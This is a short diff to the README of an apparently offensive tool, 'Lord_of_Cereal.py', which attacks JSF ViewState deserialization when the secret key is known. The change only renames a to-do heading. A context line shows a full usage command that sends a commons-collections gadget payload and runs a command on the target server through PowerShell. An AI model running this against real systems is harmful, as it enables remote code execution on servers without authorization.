@@ -25,7 +25,7 @@ This tool is meant for situations when the encryption and/or HMAC secret from th
 python Lord_of_Cereal.py -u "http://192.168.1.10:8080/sub.faces" -e DES -s s3cr3tk3y -p commons3 -t javax.faces.ViewState -c "ping 192.168.10.8" -f powershell
 ```
 
-## To do:
+## To do (tool still a work in progress):
 * Add support for other encryption methods
 * Add support for other HMAC digest methods
 * Add separate option for when the encryption secret and HMAC secret differ
